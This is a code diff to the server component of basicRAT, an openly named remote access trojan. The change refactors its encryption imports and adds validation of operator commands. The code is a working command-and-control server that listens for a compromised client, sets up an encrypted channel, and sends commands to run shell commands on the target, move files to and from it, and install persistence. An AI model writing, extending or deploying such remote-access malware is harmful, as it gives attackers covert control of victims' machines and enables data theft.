@@ -14,6 +14,7 @@ import sys
 import time
 
 from core import common
+from core import crypto
 from core import filesock
 
 
@@ -30,20 +31,20 @@ BANNER = '''
          https://github.com/vesche/basicRAT
 '''
 HELP_TEXT = '''
-download <files> - Download file(s).
-help            - Show this help menu.
-persistence     - Apply persistence mechanism.
-rekey           - Regenerate crypto key.
-run <command>   - Execute a command on the target.
-upload <files>   - Upload files(s).
-quit            - Gracefully kill client and server.
+download <files>    - Download file(s).
+help                - Show this help menu.
+persistence         - Apply persistence mechanism.
+rekey               - Regenerate crypto key.
+run <command>       - Execute a command on the target.
+upload <files>      - Upload files(s).
+quit                - Gracefully kill client and server.
 '''
+COMMANDS = [ 'download', 'help', 'persistence', 'rekey', 'run', 'upload',
+             'quit' ]
 
 
 def get_parser():
     parser = argparse.ArgumentParser(description='basicRAT server')
-    parser.add_argument('-c', '--crypto', help='C2 crypto to use.',
-                        default='AES', type=str)
     parser.add_argument('-p', '--port', help='Port to listen on.',
                         default=1337, type=int)
     return parser
@@ -53,12 +54,6 @@ def main():
     parser  = get_parser()
     args    = vars(parser.parse_args())
     port    = args['port']
-    crypto  = args['crypto']
-
-    if crypto == 'AES':
-        from core.crypto import diffiehellman
-        from core.crypto import AES_encrypt as encrypt
-        from core.crypto import AES_decrypt as decrypt
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -77,7 +72,7 @@ def main():
     s.listen(10)
     conn, addr = s.accept()
 
-    DHKEY = diffiehellman(conn, server=True)
+    DHKEY = crypto.diffiehellman(conn, server=True)
     # debug: confirm DHKEY matches
     # print binascii.hexlify(DHKEY)
 
@@ -91,13 +86,18 @@ def main():
         # seperate prompt into command and action
         cmd, _, action = prompt.partition(' ')
 
+        # ensure command is valid before sending
+        if cmd not in COMMANDS:
+            print 'Invalid command, type "help" to see a list of commands.'
+            continue
+
         # display help text
         if cmd == 'help':
             print HELP_TEXT
             continue
 
         # send data to client
-        conn.send(encrypt(prompt, DHKEY))
+        conn.send(crypto.AES_encrypt(prompt, DHKEY))
 
         # stop server
         if cmd == 'quit':
@@ -107,7 +107,7 @@ def main():
         # results of command
         elif cmd == 'run':
             recv_data = conn.recv(4096)
-            print decrypt(recv_data, DHKEY)
+            print crypto.AES_decrypt(recv_data, DHKEY)
 
         # download a file
         elif cmd == 'download':
@@ -124,16 +124,13 @@ def main():
         # regenerate DH key (dangerous! may cause connection loss!)
         # available in case a fallback occurs or you suspect eavesdropping
         elif cmd == 'rekey':
-            DHKEY = diffiehellman(conn, server=True)
+            DHKEY = crypto.diffiehellman(conn, server=True)
 
         # results of persistence
         elif cmd == 'persistence':
             print 'Applying persistence mechanism...'
             recv_data = conn.recv(1024)
-            print decrypt(recv_data, DHKEY)
-
-        else:
-            print 'Invalid command, type "help" to see a list of commands.'
+            print crypto.AES_decrypt(recv_data, DHKEY)
 
 
 if __name__ == '__main__':
